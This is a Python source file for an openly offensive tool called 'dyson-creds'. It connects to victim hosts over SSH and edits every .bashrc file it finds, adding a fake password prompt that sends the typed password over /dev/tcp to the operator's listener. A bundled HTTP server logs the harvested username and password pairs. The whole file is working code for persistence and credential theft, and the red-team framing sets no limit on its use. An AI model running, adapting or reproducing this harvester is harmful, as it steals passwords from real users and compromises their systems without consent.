import argparse
import paramiko 
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer

# parse victims file into dictionary and return 
def parse_victims(victims_file, subnets=[]):
    victims_temp_list = []
    victims_temp_dict = {}
    with open(victims_file, "r") as f:
        for line in f:
            if "X" in line and len(subnets) > 0:
                for subnet in subnets:
                    victims_temp_list.append(line.strip().replace("X", subnet))
            else:
                victims_temp_list.append(line.strip())

    victims_temp_dict = dict(v.split(':') for v in victims_temp_list)
    return victims_temp_dict

def construct_bashrc_install_cmd(lhost, lport, extra_paths=[]):
    paths = "/home /root "
    if len(extra_paths) > 0:
        paths += ' '.join(extra_paths)

    command = """find """ + paths + """ -iname "*.bashrc" -exec sed -i '3 i read -sp "password for $USER: " sudopass; sleep 1; (echo "GET /collector?user=$USER&password=$sudopass" > /dev/tcp/""" + lhost + """/""" + lport + """); echo ""' {} \;"""
    
    return command 


# deploy credential harvesters to victims
def deploy_harvesters(victims_dict, verbose, lhost, lport, user, password, extra_paths=[]):

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for victim in victims_dict:
        print(f"Attempting to deploy credential harvester to {victim}...") if verbose else None
        
        # Construct command to be executed on victim
        command = construct_bashrc_install_cmd(lhost, lport, extra_paths)
        
        # deploy credential harvester
        try:
            ssh.connect(victim, username=user, password=password, port=victims_dict[victim])
            ssh.exec_command(command)
            ssh.close()
        except:
            print(f"Error deploying credential harvester for {victim}.")
        

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.protocol_version = "HTTP/1.1"
        self.send_response(200)
        self.end_headers()

        try:
            user = self.path.split("&")[0].split("=")[1]
            password = self.path.split("&")[1].split("=")[1]
            host = self.client_address[0]
            tme = datetime.now().strftime("%H:%M:%S")
        except:
            print("[-] Error parsing request")
            return
        
        try:
            with open ("assets/credentials.log", "a") as f:
                f.write(f"[{tme}] | Found {user}:{password} on {host}\n")
                f.close()
        except:
            print("[-] Error writing to assets/credentials.log, check if file exists and is writable")
            return

        return 
        
def run_web_server(lport):
    server_address = ('', int(lport))
    httpd = HTTPServer(server_address, RequestHandler)
    httpd.serve_forever()
    
if __name__ == "__main__":
    # collect arguments
    parser = argparse.ArgumentParser(
        prog="dyson-creds",
        description="Similar to a Dyson Sphere that harvests energy from remote stars, dyson-creds harvests credentials from remote systems through credential harvesters placed via SSH connections.",
        epilog="This tool is supposed to be used early in red team engagements as a means of persistence and credential harvesting.")

    parser.add_argument("-lh", "--lhost", help="IP address of the local system")
    parser.add_argument("-lp", "--lport", help="Port to serve the HTTP server on", default="80")
    
    parser.add_argument("-v", "--victims", help="Path to a file containing the IP addresses of the victims")
    # victim subnets
    parser.add_argument("-s", "--subnets", help="Subnets for victims, e.g: 1 2 3 4", default="")
    
    parser.add_argument("-u", "--user", help="Username to use when connecting to the victims")
    parser.add_argument("-p", "--password", help="Password to use when connecting to the victims")

    # verbose mode
    parser.add_argument("-vvv", "--verbose", help="Enable verbose mode", action="store_true")

    # Extra paths to look for .bashrc files
    parser.add_argument("-e", "--extra", help="Extra paths to look for .bashrc files, e.g. /etc", default="")

    # parse arguments
    args = parser.parse_args()

    # parse provided victims file
    print(f"Parsing victims file at {args.victims}...")        
    victims_dict = parse_victims(args.victims, args.subnets.split())
    
    # deploy credential harvesters
    print("Deploying credential harvesters...")
    deploy_harvesters(victims_dict, args.verbose, args.lhost, args.lport, args.user, args.password)

    print("Starting HTTP server...")
    run_web_server(args.lport)
    
